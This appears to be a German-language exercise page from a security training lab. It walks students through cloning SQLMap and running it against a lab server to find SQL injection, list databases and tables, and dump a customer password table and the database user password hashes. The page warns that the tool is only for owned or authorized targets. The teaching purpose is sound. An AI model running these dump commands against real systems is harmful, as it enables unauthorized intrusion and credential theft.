@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <title>SQLMap</title>
+</head>
+<body>
+    <h1> Aufgabe:</h1>
+    Da das Ausnutzen einer SQL-Injection von Hand sehr aufwendig sein kann, gibt es unter anderen das Tool <a href="https://github.com/sqlmapproject/sqlmap">SQLMap</a>. Das Tool kann einem beim Ausnutzen und auch beim finden von SQL-Injection Schwachstellen helfen. In diesem Teil soll es darum gehen SQLMap einmal auszuprobieren und die Schwachstellen automatisiert auszunutzen.
+    <br><br>
+    <b>VORSICHT:</b> SQLMap darf natürlich nur gegen Ziele, die einem selber gehören oder gegen Ziele für die das ausdrücklich erlaubt ist eingesetzt werden!
+
+    <h3>Ziel:</h3>
+    Verwendung des Open Source Tools SQLMap.
+    <h1>Kundenlogin</h1>
+
+    <ol>
+        <li>Öffne das Terminal navigiere mit "cd /tmp" in den /tmp Ordner und füge folgende Zeile ein<br><pre>git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev</pre> </li>
+        <li>Navigiere mit "cd sqlmap-dev" in den Ordner</li>
+        <li>Führe mittels "python3 sqlmap.py" das Tool aus. Wenn alles geklappt hat, dann sollte unter anderem das sqlmap-Logo im Terminal erscheinen</li>
+        <li>Starte die Erkennung von SQL-Injection Schwachstellen, indem du <pre>python3 sqlmap.py -u http://[IP-Adresse des Servers]:5000/search --forms</pre> eingibst. Die Fragen kannst du erstmal alle mit Entern bestätigen.<br> Wie du siehst werden jetzt alle möglichen Tests durchgeführt (das kann einen Moment dauern)</li>
+        <li>Wenn alles geklappt hat, dann hat er vier verschiedene Möglichkeiten gefunden, die Datenbank anzugreifen.</li>
+        <li>Starte SQLmap erneut und suche nach allen vorhandenen Datenbanken mit <pre>python3 sqlmap.py -u http://[IP-Adresse des Servers]:5000/search --forms --dbs</pre></li>
+        <li>Wir wollen uns nun auf die Datenbank <b>SQLInjection</b> konzentrieren und fügen unserem Befehl also den Parameter -D SQLInjection an. Von dieser Datenbank wollen wir die Tabellen auslesen:
+        <pre>python3 sqlmap.py -u http://[IP-Adresse des Servers]:5000/search --forms -D SQLInjection --tables</pre></li>
+        <li>Nun wollen wir natürlich die Passwörter auslesen: <pre>python3 sqlmap.py -u http://[IP-Adresse des Servers]:5000/search --forms -D SQLInjection -T Kunden_Passwoerter --dump</pre></li>
+        <li>Es gibt auch die Möglichkeit die Passwörter (oder zumindest die Hashes) der Datenbanknutzer auszulesen. <pre>python3 sqlmap.py -u http://[IP-Adresse des Servers]:5000/search --forms --passwords</pre> Was fällt dir auf für die Passwörter von student und studentNetwork</li>
+        <li>Mit <pre>python3 sqlmap.py -h</pre> kannst du die weiteren Optionen von sqlmap auflisten. Versuche weitere Tabellen auszulesen und weitere Optionen zu verwenden.</li>
+    </ol>
+    <a href="/">Zurück</a>
+</body>
+</html>
